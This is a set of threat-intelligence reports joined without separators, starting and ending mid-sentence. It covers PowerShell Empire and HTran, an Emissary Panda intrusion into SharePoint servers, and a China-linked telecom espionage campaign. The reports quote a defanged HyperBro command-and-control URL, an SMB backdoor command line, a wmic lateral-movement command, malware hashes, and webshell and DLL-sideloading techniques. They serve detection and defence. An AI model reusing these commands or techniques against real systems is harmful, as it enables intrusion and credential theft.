their privileged credentials. Detailed information on securing Active Directory is available from Microsoft 8 . Network defenders should audit the use of scripts, particularly PowerShell, and inspect logs to identify anomalies. This will aid identification of Mimikatz or pass - the - hash abuse, as well as providing some mitigation against attempts to bypass detection software . 8 https://docs.microsoft.com/en - us/windows - server/identity/ad - ds/plan/security - best - practices/best - practices - for - securing - active - directory Page 12 Joint report on publicly available hacking tools Lateral movement framewor ks: PowerShell Empire PowerShell Empire is an example of a post exploitation or lateral movement tool. It is designed to allow an attacker (or penetration tester) to move around a network after gaining initial access. Other examples of these tools include Cobalt Strike and Metasploit. Empire can also be used to generate malicious documents and executables for social engineering access to networks. The PowerShell Empire framework (Empire) was designed as a legitimate penetration testing tool in 2015. Empire acts as a framework for continued exploitation once an attacker has gained access to a system. The tool provides an attacker with the ability to escalate privileges, harvest credentials, exfiltrate information and move laterally across a network. These cap abilities make it a powerful exploitation tool. Because it is built on a common, legitimate application (PowerShell) and can operate almost entirely in memory, Empire can be difficult to detect on a network using traditional antivirus tools. In use PowerSh ell Empire has become increasingly popular among hostile state actors and organised criminals. In recent years we have seen it used in cyber incidents globally across a wide range of sectors. Initial exploitation methods vary between compromises, and actor s can configure the Empire Framework uniquely for each scenario and target. This, in combination with the wide range of skill and intent within the Empire user community, means that ease of detection will vary. Nonetheless, having a greater understanding a nd awareness of this tool is a step forward in defending against its use by malicious actors. Capabilities implements the ability to run PowerShell scripts without needing present on the system. Its communications are encrypted and its architecture flexible. with a customisable range of options to pursue their g oals on the victim's systems. These include escalation of privileges, credential harvesting, host enumeration, key - logging and the ability to move laterally across a network. it a popular choice for actors of varying abilities. Joint report on publicly available hacking tools Page 13 Examples During an incident in February 2018, a UK energy sector company was compromised by an the tool's default pr accounts are believed to have provided the actor with initial access to the network. In early 2018, an unknown actor used Winter Olympics themed socially engineered emails and malicious attachments in a spear phishing campaign targeting several South Korean organisations. This attack had an additional layer of sophistication, making use of Invoke - PSImage, a tool that will encode any PowerShell script into an image. In December 2017, the h ostile actor APT19 targeted a multinational law firm with a targeted phishing campaign. APT19 used obfuscated PowerShell macros embedded within Word documents generated by Empire. Our cyber security authorities are also aware of Empire being used to targe t academia. In one reported instance, an actor attempted to use Empire to gain persistence using a Windows Management Instrumentation (WMI) event consumer. However, in this instance the Empire agent was unsuccessful in establishing network connections due to the HTTP connections being blocked by a local security appliance. Detection and protection Identifying malicious PowerShell activity can be difficult, due to the prevalence of legitimate PowerShell on hosts and its increased use in maintaining a corpor ate environment. To identify potentially malicious scripts, PowerShell activity should be comprehensively logged. This should include script block logging and PowerShell transcripts. Older versions of PowerShell should be removed from environments to ensur e that they cannot be used to circumvent additional logging and controls added in more recent versions of PowerShell. The Digital Shadows blog 9 provides a good summary of PowerShell security practices. The code integrity features in recent versions of Windows can be used to limit the functionality of PowerShell, preventing or hampering malicious PowerShell in the event of a successful intrusion. A combinatio n of script code signing, application whitelisting and constrained language mode will prevent or limit the effect of malicious PowerShell in the event of a successful intrusion. These controls will also impact legitimate scripts and it is strongly advised that they be thoroughly tested before deployment. When organisations profile their PowerShell usage, they often find it is only used legitimately by a small number of technical staff. Establishing the extent of this legitimate activity will make it easier to monitor and investigate suspicious or unexpected PowerShell usage elsewhere on the network. 9 https://www.digitalshadows.com/blog - and - research/powershell - security - best - practices/ Page 14 Joint report on publicly available hacking tools C2 obfuscation tools : HTran Attackers will often want to disguise their location when compromising a target. To do this, they may use generic privacy tools such as TOR, or more specific tools to obfuscate their location. HUC Packet Transmitter (HTran) is a proxy tool, used to intercept and redirect Transmission Control Protocol (TCP) connections from the local host to a remote host. This makes it possible to obfu scate an attacker's communications with victim networks. The tool has been freely available on the internet since at least 2009. HTran facilitates TCP connections between the victim and a hop point controlled by an attacker. Malicious cyber actors can use this technique to redirect their packets through multiple compromised hosts running HTran, to gain greater access to hosts in a network. In use The use of HTran has been regularly observed in compromises of both government and industry targets. A broad ra nge of cyber actors have been observed using HTran and other connection proxy tools to: e vade intrusion and detection systems on a network b lend in with common traffic or leverage domain trust relationships to bypass security controls o bfuscate or hide C 2 infrastructure or communications c reate peer - to - peer or meshed C2 infrastructure to evade detection and provide resilient connections to infrastructure Capabilities HTran can run in several modes , each of which forwards traffic across a network by bridging two TCP sockets. They differ in terms of where the TCP sockets are initiated from, either locally or remotely. The three modes are: Server (listen) Both TCP sockets initiated remotely Client (slave) Both TCP sockets initiated locally Pr oxy (tran) One TCP socket initiated remotely , the other initiated locally, upon receipt of traffic from the first connection HTran can inject itself into running processes and install a rootkit to hide network connections from the host operating system. Using these features also creates Windows registry entries to ensure that HTran maintains persistent access to the victim network. Joint report on publicly available hacking tools Page 15 E xamples Recent investigations by our cyber security authorities have identified the use of HTran to maintain and obfusca te remote access to targeted environments. In one incident, the attacker compromised externally facing web servers running outdated and vulnerable web applications. This access enabled the upload of web shells, which were then used to deploy other tools, i ncluding HTran. HTran was installed into the ProgramData directory and other deployed tools were used to reconfigure the server to accept Remote Desktop Protocol (RDP) communications. The actor issued a command to start HTran as a client, initiating a conn ection to a server located on the internet over port 80, which forwards RDP traffic from the local interface. In this case, HTTP was chosen to blend in with other traffic that was expected to be seen originating from a web server to the internet. Other wel l - known ports used included: p ort 53 DNS p ort 443 - HTTP over TLS/SS L p ort 3306 - MySQL By using HTran in this way, the actor was able to use RDP for several months without being detected. Detection and protection Attackers need access to a machine to install and run HTran, so network defenders should apply security patches and use good access control to prevent attackers installing malicious applications. Network monitoring 10 and firewalls can help prevent and detect unauthorised connections from tools such as HTran. In some of the samples analysed, the rootkit component of HTran only hides connection details when the proxy mode is used. When client mode is used, defenders can view details about the TCP connections being made. HTran also includes a debugging condition that is useful for network defenders. In the event that a destination becomes unavailable, HTran generates an error message using the following forma t: \\\\ r \\\\ This error message is relayed to the connecting client in the clear. Defenders can monitor for this error message to potentially detect HTran instances active in their environments. 10 https://www.ncsc.gov.uk/guidance/introduction - logging - security - purposes Page 16 Joint report on publicly available hacking tools General detection and prevention measures There are several measures that will improve the overall cyber security of your organisation and help protect it against the types of tools highlighted by this report.

We believe the adversary exploited a recently patched vulnerability in Microsoft SharePoint tracked by CVE-2019-0604, which is a remote code execution vulnerability used to compromise the server and eventually install a webshell. The actors uploaded a variety of tools that they used to perform additional activities on the compromised network, such as dumping credentials, as well as locating and pivoting to additional systems on the network. Of particular note is their use of tools to identify systems vulnerable to CVE-2017-0144, which is the same vulnerability exploited by EternalBlue that is best known for its use in the WannaCry attacks of 2017.\\nThis activity appears related to campaigns exploiting CVE-2019-0604 mentioned in recent security alerts from Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security. In addition to the aforementioned post-exploitation tools, the actors used these webshells to upload legitimate executables that they would use DLL sideloading to run a malicious DLL that has code overlaps with known Emissary Panda attacks. We also found the China Chopper webshell on the SharePoint servers, which has also been used by the Emissary Panda threat group.\\nIn this blog, we provide details of the tools and tactics we observed on these compromised SharePoint servers, explain how we believe these connect to the Emissary Panda threat group, correlate our findings with those of the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security, and provide indicators of compromise (IoCs) from our research. You can find the Adversary Playbook for the activity detailed in this blog here.\\nAttack Overview\\nThis webshell activity took place across three SharePoint servers hosted by two different government organizations between April 1, 2019 and April 16, 2019, where actors uploaded a total of 24 unique executables across the three SharePoint servers. Figure 1 shows a timeline of when the files were uploaded to the three webshells. The timeline shows three main clusters of activity across the three webshells, with activity occurring on two separate webshells (green and orange) within a very small window of time on April 2, 2019 and the activity involving the third webshell two weeks later on April 16, 2019. The actors uploaded several of the same tools to across these three webshells, which provides a relationship between the incidents and indicates that a single threat group is likely involved.\\nFigure 1. Timeline of file uploads across three related webshells\\nThe tools uploaded to the webshells range from legitimate applications such as cURL to post-exploitation tools such as Mimikatz. The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in MS17-010 commonly exploited by EternalBlue to move laterally to other systems on the network. We also observed the actors uploading custom backdoors such as HyperBro which is commonly associated with Emissary Panda. Based on the functionality of the various tools uploaded to the webshells, we believe the threat actors breach the SharePoint servers to use as a beachhead, then attempt to move laterally across the network via stolen credentials and exploiting vulnerabilities.\\nWebshells Installed\\nAs previously mentioned, we found webshells installed on three SharePoint servers hosted at two different organizations, two of which had the same file name of errr.aspx and the other a filename of error2.aspx. The webshells were hosted at the following paths on the compromised servers:\\n/_layouts/15/error2.aspx\\n/_layouts/15/errr.aspx\\nWe were able to gather one of the webshells with which we saw the actor interacting, specifically the error2.aspx file listed above. The error2.aspx file (SHA256: 006569f0a7e501e58fe15a4323eedc08f9865239131b28dc5f95f750b4767b38) is a variant of the Antak webshell, which is part of a tool created for red teaming called Nishang. The specific variant of Antak in error2.aspx is version v0.5.0, which is an older version of the webshell that was updated in August 2015 to v0.7.6 to include some basic authentication functionality and the ability to perform SQL queries. It’s possible the actors obtained Antak v0.5.0 via the Nishang GitHub repository or from SecWiki’s GitHub that also has the v0.5.0 version of Antak. Figure 2 shows the Antak webshell loaded on one of the Sharepoint servers.\\nFigure 2. Antak webshell ‘error2.aspx’ used to upload post-exploitation tools\\nWhile we observed the threat actor uploading additional tools to the Antak webshell above, the Sharepoint server also had several other webshells installed. The additional webshells, specifically stylecs.aspx, stylecss.aspx, and test.aspx are listed in Table 1, and appear related to the China Chopper webshell. We cannot be sure all of these webshells were installed by the same actors, as multiple actors could have exploited the SharePoint server. For instance, the China Chopper-related webshells are one-line of JScript code that could be easily copied and used by multiple groups, and the Antak webshell is easily obtained from publicly accessible repositories. However, the installation of China Chopper and the uploading of Emissary Panda related custom payloads to the Antak webshell suggests they are likely related, as this threat group has used China Chopper to compromise servers in the past.\\nFilename\\nSHA256\\nstylecs.aspx\\n2feae7574a2cc4dea2bff4eceb92e3a77cf682c0a1e78ee70be931a251794b86\\nstylecss.aspx\\nd1ab0dff44508bac9005e95299704a887b0ffc42734a34b30ebf6d3916053dbe\\ntest.aspx\\n6b3f835acbd954af168184f57c9d8e6798898e9ee650bd543ea6f2e9d5cf6378\\nTable 1. Additional webshells hosted on Sharepoint server\\nThe stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request. Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter e358efa489f58062f10dd7316b65649e. The parameter e358efa489f58062f10dd7316b65649e is interesting as it is the MD5 hash for the letter ‘t’, which is a known parameter for China Chopper as mentioned in the next section.\\nFigure 3. China Chopper code found in stylecs.aspx webshell on SharePoint server\\nThe stylecss.aspx webshell is very similar to the stylecs.aspx, as it runs JScript provided within the e358efa489f58062f10dd7316b65649e parameter of the URL; however, the stylecss.aspx webshell does not accept base64 encoded JScript, but expects the JScript in cleartext that the actor would provide as URL safe text. Figure 4 shows the code within stylecss.aspx, which when compared to Figure 3 above shows the lack of the base64 decoding function ‘FromBase64String’.\\nFigure 4. China Chopper code found in stylecss.aspx webshell on SharePoint server\\nThe last webshell extracted from the Sharepoint server had a filename of test.aspx, which is very similar to the stylecs.aspx webshell as it runs base64 encoded JScript provided in the URL of the request. However, the test.aspx webshell uses a parameter related to the compromised organization to obtain the base64 encoded JScript that it will run and display within the browser. The test.aspx shell also includes code that sets the HTTP response status to a 404 Not Found, which will display an error page but will still run the provided JScript. Figure 5 shows the code within the test.aspx file.\\nFigure 5. China Chopper code found in test.aspx webshell on SharePoint server\\nLinks to Security Advisories\\nIn April 2019, several national security organizations released alerts on CVE-2019-0604 exploitation, including the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security. Both of these alerts discussed campaigns in which actors used the CVE-2019-0604 to exploit SharePoint servers to install the China Chopper webshell. While we cannot confirm all of the claims made in these advisories, we noticed overlaps in the webshell code hosted on the compromised SharePoint servers we observed and the webshells mentioned in these advisories.\\nThe Saudi Arabian National Cyber Security Center’s alert provided details regarding the activities carried out by the adversary. This alert also displayed the code associated with the China Chopper webshell observed in the attacks, which included Request.Item“t” to obtain JScript code from the ‘t’ parameter of the URL. As mentioned in the previous section, stylecs.aspx and stylecss.aspx both used a parameter of e358efa489f58062f10dd7316b65649e, which is the MD5 hash of ‘t’. This may suggest the actor modified the script slightly between the attack we observed, and the attack mentioned in the NCSC advisory, all while retaining the same functionality. Also, the NCSC advisory mentioned that the actors used a file name stylecss.aspx for their webshell, which is the same filename we saw associated with China Chopper.\\nThe alert from the Canadian Center for Cyber Security included the SHA256 hashes of the files associated with the campaign, one of which was 05108ac3c3d708977f2d679bfa6d2eaf63b371e66428018a68efce4b6a45b4b4 for a file named pay.aspx. The pay.aspx file is part of the China Chopper webshell and is very similar to the stylecss.aspx webshell we discussed above, with the only major difference is the URL parameter of ‘vuiHWNVJAEF’ within the URL that pay.aspx webshell uses to obtain and run JScript. Figure 6 below shows a comparison between the stylecss.aspx and pay.aspx files.\\nFigure 6. Comparison between stylecss.aspx webshell and pay.aspx webshell discussed in Canadian Center for Cyber Security advisory\\nTools Uploaded\\nDuring our research into this attack campaign, Unit 42 gathered several tools that the actor uploaded to the three webshells at the two government organizations. The chart in Figure 7 shows the same tools being uploaded to the webshells, which provided an initial linkage between the activities. One of the overlapping tools uploaded to the webshells is the legitimate cURL application, which could be used by multiple groups. The other overlapping files are tools used by the adversary to locate other systems on the network (etool.exe), check to see if they are vulnerable to CVE-2017-0144 (EternalBlue) patched in MS07-010 (checker1.exe) and pivot to them using remote execution functionality offered by a tool similar to PsExec offered by Impacket (psexec.exe). These tools are not custom made by the adversary but still provide a medium confidence linkage between the activities. We also observed the actors uploading the HyperBro backdoor to one of the webshells, as well as legitimate executables that would sideload malicious DLLs that have overlapping code associated with known Emissary Panda activity.\\nFigure 7. Relationships between tools uploaded to the three webshells hosted on SharePoint servers\\nThe actors uploaded 10 portable executables to the error2.aspx webshell, as seen in Table 2. The list of tools uploaded to this webshell includes legitimate applications, such as cURL and a component of Sublime Text used to sideload a malicious DLL, which we will discuss in an upcoming section. The list also includes several hack tools, such as Mimikatz for credential dumping and several compiled python scripts used to locate and compromise other systems on the local network. Lastly, we saw the actor uploading a custom backdoor called HyperBro, which has been associated with Emissary Panda operations in the past. We will provide an analysis of the HyperBro tool in an upcoming section.\\nFilename\\nSHA256\\nDescription\\nm2.exe\\nb279a41359367408c627ffa8d80051ed0f04c76fbf6aed79b3b2963203e08ade\\nPacked Mimikatz tool.\\npsexec.exe\\n7eea6e15bb13a3b65cca9405829123761bf7d12c6dc3b81ce499d8f6a0b25fb7\\nCompiled Impacket psexec\\ns.exe\\n04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462\\nHyperBro backdoor\\ncurl.exe\\nabc16344cdfc78f532870f4dcfbb75794c9a7074e796477382564d7ba2122c7d\\nLegitimate cURL\\ncurl.exe\\nbbb9cd70fdc581812822679e6a875dcf5b7d32fd529a1d564948a5a3f6f9e3ab\\nLegitimate cURL\\nchecker1.exe\\n090cefebef655be7f879f2f14bd849ac20c4051d0c13e55410a49789738fad98\\nCompiled EternalBlue checker script\\netool.exe\\n38fa396770e0ecf60fe1ce089422283e2dc8599489bd18d5eb033255dd8e370c\\nC# Tool, likely from https://github.com/mubix/netview\\nplugin_host.exe\\n738abaa80e8b6ed21e16302cb91f6566f9322aebf7a22464f11ee9f4501da711\\nLegitimate Sublime Text plugin host\\nPYTHON33.dll\\n2dde8881cd9b43633d69dfa60f23713d7375913845ac3fe9b4d8a618660c4528\\nSideloaded DLL loaded by Sublime Text\\ncurl.exe\\nbbb9cd70fdc581812822679e6a875dcf5b7d32fd529a1d564948a5a3f6f9e3ab\\nLegitimate cURL.\\nTable 2.

Unique tools uploaded to the errr.aspx webshell installed on a SharePoint server\\nTwo of the tools, specifically the compiled zzz_exploit.py and checker.py suggest the actor would check and exploit remote systems if they were not patched for MS17-010, which patched the CVE-2017-0144 (EternalBlue) vulnerability. Also, the use of the Mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems. We were able to gather the command line arguments the actor used to run the SMB backdoor smb1.exe. The following arguments shows the actor using the SMB backdoor to attempt to run a batch script m.bat on a remote host using a domain username and the account’s password hash:\\nc:\\\\programdata\\\\smb1.exe <redacted 10.0.0.0/8 IP> <redacted domain>\\\\<redacted username> :<redacted password hash> winsk c:\\\\programdata\\\\m.bat\\nWe saw far fewer portable executable files uploaded to the second errr.aspx webshell, specifically the 3 files seen in Table 4. The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell. Also, we observed the actor uploading a legitimate Microsoft application that would sideload a malicious DLL, of which was very similar to the DLL sideloaded by the Sublime Text plugin host that was uploaded to the error2.aspx webshell.\\nFilename\\nSHA256\\nDescription\\nchecker1.exe\\nd0df8e1dcf30785a964ecdda9bd86374d35960e1817b25a6b0963da38e0b1333\\nCompiled MS17-010 checker\\nCreateMedia.exe\\n2bb22c7b97e4c4d07e17a259cbc48d72f7e3935aa873e3dd78d01c5bbf426088\\nLegitimate CreateMedia.exe application from Microsoft’s System Center 2012 Configuration Manager\\nCreateTsMediaAdm.dll\\n06510504f30feb1adc7e423d5a24e67e5b97acbfafe40f253a054be8b1c4e8d7\\nSideloaded DLL loaded by CreateMedia.exe\\nTable 4. Unique tools uploaded to the errr.aspx webshell installed on a SharePoint server\\nEmissary Panda Specific Tools\\nMany of the tools uploaded to these webshells are hacking tools that are publicly accessible and could be used by multiple threat actors. However, several of the tools uploaded to the webshells appear to be custom made and likely related to the Emissary Panda threat group.\\nHyperBro\\nThe s.exe (SHA256: 04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462) uploaded to the error2.aspx webshell is a self-extracting 7-zip archive that is an example of the HyperBro backdoor. According to Kaspersky and SecureWorks research, HyperBro is a custom backdoor developed and used by Emissary Panda in their attack campaigns. This sample of HyperBro is similar to the sample discussed in Kaspersky’s research, specifically using a legitimate pcAnywhere application to sideload a DLL to decrypt, decompress and run a payload embedded within a file named ‘thumb.db’. Table 5 shows the three files associated with this HyperBro sample, which have the same file names as the self-extracting 7zip archives mentioned in Kaspersky’s blog (SHA256 hashes: 34a542356ac8a3f6e367c6827b728e18e905c71574b3813f163e043f70aa3bfa and 2144aa68c7b2a6e3511e482d6759895210cf60c67f14b9485a0236af925d8233).\\nFilename\\nSHA256\\nDescription\\nthinprobe.exe\\n76d2e897ca235beab44ee7eaab9ede7bc7868bbaeb7d6cb10b4323c07eb216af\\nSymantec pcAnywhere thinprobe application\\nthinhostprobedll.dll\\nd40414b1173d59597ed1122361fe60303d3526f15320aede355c6ad9e7e239af\\nSideloaded DLL loaded by thinprobe.exe\\nthumb.db\\n270ea24f2cef655bd89439ab76c1d49c80caaa8899ffa6f0ef36dc1beb894530\\nContains encrypted and compressed DLL payload run by sideloaded DLL\\nTable 5. Files associated with the HyperBro tool uploaded to webshell on SharePoint server\\nThe functional payload is a DLL compiled on 2019-03-11 02:23:54, which has two functionalities depending if the binary has a command line argument -daemon or -worker passed to it. The daemon functionality handles the C2 communications portion of the Trojan, which is configured to communicate with 185.12.45.134 over HTTPS using the following URL:\\nhxxps://185.12.45.134:443/ajax\\nThe worker functionality acts on the data received from the C2 server, which is passed from the daemon to the worker via a named pipe called “\\\\\\\\.\\\\pipe\\\\testpipe“. The worker subjects the received data to a command handler whose available commands are listed in Table 6.\\nCommand\\nSub-command\\nDescription\\n0x12\\nFile manager\\n0x10\\nEnumerate logical storage volumes\\n0x11\\nDelete a specified file\\n0x12\\nUpload a file\\n0x13\\nDownload a file\\n0x17\\nList contents of a folder\\n0x19\\nRun an application (CreateProcessW) or script/file (ShellExecuteW)\\n0x13\\nExecute command on shell\\n0x16\\nTakes screenshot\\n0x19\\nRuns shellcode it injects into a newly created process ‘msiexec.exe’\\n0x1a\\nKill specific process\\n0x1e\\nService manager\\n0x17\\nList all services and their configurations\\n0x19\\nStart a specified service\\n0x1a\\nStop a specified service\\nTable 6.

The plugin_host.exe application imports several functions from a library named python33, which is how the legitimate application sideloads the malicious DLL named PYTHON33.dll. This is the first instance we have observed Sublime Text’s plugin host application used for sideloading. Like the plugin host application, the CreateMedia.exe application imports several functions from a library named CreateTsMediaAdm that is leveraged to load the malicious DLL named CreateTsMediaAdm.dll.\\nThe PYTHON33.dll and the CreateTsMediaAdm.dll libraries are very similar with BinDiff providing a 97% similarity with 99% confidence between the two DLLs. The code diff in Figure 8 shows the decryption routine in PYTHON33.dll (right) and CreateTsMediaAdm.dll (left), both of which use an eight byte XOR key to decrypt a piece of shikata_ga_nai obfuscated shellcode. The shellcode is responsible for patching the entry point of the legitimate application to call another function in the shellcode that is responsible for loading a file with the library name with an .hlp extension (PYTHON33.hlp or CreateTsMediaAdm.hlp).\\nFigure 8. Code comparison between the sideloaded CreateTsMediaAdm.dll and PYTHON33.dll files uploaded to two webshells\\nUnfortunately, we do not have access to the PYTHON33.hlp or CreateTsMediaAdm.hlp files, so we do not know the final payload loaded by either of these DLLs. However, using NCC Group’s research published in May 2018, we were able to discover code overlaps between these DLLs and a sideloaded DLL that ran the SysUpdate tool that the NCC group has associated with an Emissary Panda campaign. Figure 9 shows a code comparison between the PYTHON33.dll (right) and inicore_v2.3.30.dll (left) (SHA256: 4d65d371a789aabe1beadcc10b38da1f998cd3ec87d4cc1cfbf0af014b783822), which was sideloaded to run the SysUpdate tool in a previous Emissary Panda campaign. The code overlaps below include the same technique to find the entry point of the loading executable and decrypting the first piece of shellcode used to patch the entry point.\\nFigure 9. Code comparison between the sideloaded PYTHON33.dll uploaded to webshell and the inicore_v2.3.30.dll file sideloaded in previous Emissary Panda attacks\\nConclusion\\nThe Emissary Panda threat group loaded the China Chopper webshell onto SharePoint servers at two Government organizations in the Middle East, which we believe with high confidence involved exploiting a remote code execution vulnerability in SharePoint tracked in CVE-2019-0604. According to Microsoft’s advisory, this vulnerability was patched on March 12, 2019 and we first saw the webshell activity on April 1, 2019. This suggests that the threat group was able to quickly leverage a known vulnerability to exploit Internet facing servers to gain access to targeted networks.\\nOnce the adversary established a foothold on the targeted network, they used China Chopper and other webshells to upload additional tools to the SharePoint server to dump credentials, perform network reconnaissance and pivot to other systems. We believe the actors pivoted to other systems on the network using stolen credentials and by exploiting the CVE-2017-0144 (EternalBlue) vulnerability patched in MS17-010. We also observed the actors uploading legitimate tools that would sideload DLLs, specifically the Sublime Text plugin host and the Microsoft’s Create Media application, both of which we had never seen used for DLL sideloading before.\\nPalo Alto Networks customers are protected by:\\nThe CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft Sharepoint Remote Code Execution Vulnerability (55411)\\nAll illegitimate tools uploaded to the webshells are marked with malicious verdicts by WildFire and Traps.\\nAutoFocus customers can track the custom Emissary Panda payload seen uploaded to the webshell using the HyperBro tag, but can also track the hack tools using the following tags (note the hack tools are used by multiple actors and not just Emissary Panda):\\nSmbExec\\nPsExec\\nPsExec_Python\\nBChecker\\nZZZ_Exploit\\nTermite\\nIncognito\\nPwDump\\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.

For example, use WAF (Web Application FW) to prevent trivial attacks on Internet-facing web servers.\\nExpose as few systems or ports to the Internet as possible. Make sure that all web servers and web services that are exposed are patched.\\nUse an EDR tool to give visibility and immediate response capabilities when high severity incidents are detected.\\nProactively hunt in your environment for sensitive assets periodically.\\nTable of Contents\\nINTRODUCTION\\nANATOMY OF THE ATTACK\\nINITIAL COMPROMISE: THE MODIFIED CHINA CHOPPER WEB SHELL\\nRECONNAISSANCE AND CREDENTIAL STEALING\\nLATERAL MOVEMENT\\nMAINTAINING A LONG-TERM FOOTHOLD AND STEALING DATA\\nDATA EXFILTRATION\\nUNDERSTANDING THE MOTIVE\\nTHREAT INTEL RESEARCH\\nMETHODOLOGY\\nCONCLUSION\\nINTRODUCTION\\nWatch our CEO Lior Div\\'s keynote on the operation.\\nIn 2018, 30% of the telecommunications providers reported sensitive customer information was stolen due to an attack. These telecommunications providers have been expanding in size, to the point where In the past thirteen years, mobile cellular phone subscribers have quadrupled in size and sit at 8 billion subscribers today. Due to their wide availability and the fundamental service they bring, telecommunications providers have become critical infrastructure for the majority of world powers.\\nAsk the researchers questions about this attack during their live webinar.\\nMuch like telecommunication providers, many other critical infrastructure organizations provide a valuable targets for nation state threat actors, due to their high impact. In studies, nearly a quarter of critical infrastructure organizations reported they had been hit by nation state attacks and 60% said disruptive cyber attacks are among the threats they are most worried about.\\nThreat actors, especially those at the level of nation state, are seeking opportunities to attack these organizations, conducting elaborate, advanced operations to gain leverage, seize strategic assets, and collect information. When successful, these attacks often have huge implications.\\nLast year, we identified a threat actor that has been operating in telecommunications provider environments for at least two years. We performed a post-incident review of the attacks and were able to identify changes in the attack patterns along with new activity every quarter.\\nThe threat actor mainly sought to obtain CDR data (call logs, cell tower locations, etc.) belonging to specific individuals from various countries. This type of targeted cyber espionage is usually the work of nation state threat actors.\\nWe’ve concluded with a high level of certainty that the threat actor is affiliated with China and is likely state sponsored. The tools and techniques used throughout these attacks are consistent with several Chinese threat actors, such as APT10, a threat actor believed to operate on behalf of the Chinese Ministry of State Security (MSS).\\nThe threat actor changed activity every quarter.\\nThe attack began with a web shell running on a vulnerable, publicly-facing server, from which the attackers gathered information about the network and propagated across the network. The threat actor attempted to compromise critical assets, such as database servers, billing servers, and the active directory. As malicious activity was detected and remediated against, the threat actor stopped the attack.\\nThe second wave of the attack hit several months later with similar infiltration attempts, along with a modified version of the web shell and reconnaissance activities. A game of cat and mouse between the threat actor and the defenders began, as they ceased and resumed their attack 2 more times in the span of a 4 month period.\\nAnatomy of the Attack\\nInitial Compromise: the Modified China Chopper Web Shell\\nThe initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process. An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs. The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.\\nMalicious web shell activity as observed in the Cybereason solution.\\nCommands executed via a modified version of the China Chopper web shell.\\nChina Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors. It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers. The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye’s analysis of China Chopper. This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40. It is important to note that this tool is widely available and can be used by other threat actors.\\nReconnaissance and Credential Stealing\\nThe threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.\\nExample 1: Reconnaissance Commands\\nExample 2: Reconnaissance Commands\\nModified “nbtscan”\\nOne of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network. Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest. It is also capable of identifying system information.\\nNetBIOS Scanner execution as seen in the Cybereason solution.\\nNetBIOS scanner is set to scan an internal IP range.\\nModified Mimikatz\\nFollowing the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines. The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes. This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing. The dumped hashes were used to authenticate to other machines via pass the hash. We renamed this sample to maybemimi.exe.\\nModified Mimikatz that dumps NTLM hashes.\\nReverse engineering shows the similarity between maybemimi.exe and mimikatz.\\nMimikatz code from GitHub.\\nmaybemimi strings.\\nDumping the SAM Hive from the Registry\\nIn order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots. They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.\\nReg.exe is being spawned from a shell process.\\nCommand-line arguments indicate SAM hive dumping.\\nLateral Movement\\nOnce the threat actor mapped the network and obtained credentials (through net use), they began to move laterally. They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller. The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.\\nThe following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.\\n/c cd /d \"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\\"&wmic /node:REDACTED /user:\"REDACTED\" /password:\"REDACTED\" process call create a.bat&echo S&cd&echo E\\nWMI command used by the threat actor to move laterally.\\nMaintaining a Long-term Foothold and Stealing Data\\nThe threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action. By creating these accounts, they ensured they would maintain access between different waves of the attack. Once the threat actor regains their foothold, they already have access to a high-privileged domain user account. This significantly reduces the “noise” of having to use credential dumpers repeatedly, which helped them evade detection.\\nPoisonIvy\\nA second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY). This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK. It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine. Among its most notable features are:\\nRegistry Editor\\nScreenshot Grabber\\nCredential Stealer\\nInteractive Shell\\nFile Manager with Upload and Download Support\\nProcess Monitor\\nKeylogging and Various other Surveillance Features\\nThe control panel for PoisonIvy.\\nCourtesy of Sam Bowne - samsclass.info\\nWe assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.\\nThe strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory. To accomplish this, it exploited a trusted and signed application. The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:\\nA nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it.\\nOnce executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.\\nThe DLL 